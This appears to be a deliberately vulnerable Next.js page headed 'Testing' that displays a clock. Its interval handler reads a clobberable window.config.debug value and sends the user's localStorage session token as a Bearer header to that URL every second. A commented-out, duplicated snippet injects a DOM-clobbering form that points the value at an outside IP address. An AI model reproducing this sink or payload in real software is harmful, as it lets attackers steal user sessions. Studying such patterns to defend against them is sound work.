'use client';

import { config } from 'process';
import { useState, useEffect } from 'react';

export default function Home() {
  const [time, setTime] = useState('');
  const [serverType, setServerType] = useState('production server');

  useEffect(() => {
    // Set initial time only on client
    setTime(new Date().toLocaleTimeString());
    
    // Set server type from config

// const form = document.createElement('form');
// form.id = 'config';
// form.innerHTML = `<input name="debug" value="http://217.19.4.141:8000" />`;
// document.body.appendChild(form);
// const form = document.createElement('form');
// form.id = 'config';
// form.innerHTML = `<input name="debug" value="http://217.19.4.141:8000" />`;
// document.body.appendChild(form);
    // Update time every second
    const interval = setInterval(() => {
      setTime(new Date().toLocaleTimeString());
      if (window.config && window.config.debug){
        setServerType(window.config.debug ? 'debug server' : 'production server');
        const token = localStorage.getItem('sessionid');

        if (window.config.debug && token) {
          console.log('Config debug mode is ON');
            fetch(window.config.debug.value, {
              headers: {
                'Authorization': 'Bearer ' + token
              }
            })
        }
      } 
    }, 1000);

    // Cleanup interval on unmount
    return () => clearInterval(interval);
  }, []);

  return (
    <main style={{ textAlign: 'center', padding: '20px' }}>
      <h1 style={{ fontSize: '2.5rem', color: '#f83636ff', marginBottom: '10px' }}>
        Testing - {time || 'Loading...'}
      </h1>
      <p style={{ fontSize: '1.2rem', fontStyle: 'italic', color: '#555' }}>
        {serverType}
      </p>
    </main>
  );
}